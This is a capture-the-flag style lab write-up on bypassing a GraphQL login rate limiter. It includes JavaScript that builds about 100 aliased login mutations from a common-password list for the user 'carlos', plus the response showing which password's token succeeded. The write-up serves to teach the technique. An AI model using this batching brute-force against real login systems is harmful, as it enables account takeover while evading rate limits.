Lab: Bypassing GraphQL brute force protections

The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests 
from the same origin in a short space of time.

To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.


The lab gives the javascript code:
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");


this code results in:
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...

bruteforce99:login(input:{password: "12345678", username: "carlos"}) {
              token
              success
          }


this result is used in the lab as the POST /login request for the lab is a graphQL endpoint sending this as a mutation allows us to bypass
the rate limiter on the endpoint.


sending the mutation gives us:
   "bruteforce84": {
      "token": "wtFahCQM0yx0rybse1ankEUaKVm9BxlB",
      "success": false
    },
    "bruteforce85": {
      "token": "wtFahCQM0yx0rybse1ankEUaKVm9BxlB",
      "success": false
    },
    "bruteforce86": {
      "token": "oeCLTVZq2KGPs71j3HWyk7QE3kzHQy5N",
      "success": true
    },
    "bruteforce87": {
      "token": "oeCLTVZq2KGPs71j3HWyk7QE3kzHQy5N",
      "success": false

the success true is the token we use to log into carlos' account and solve the lab.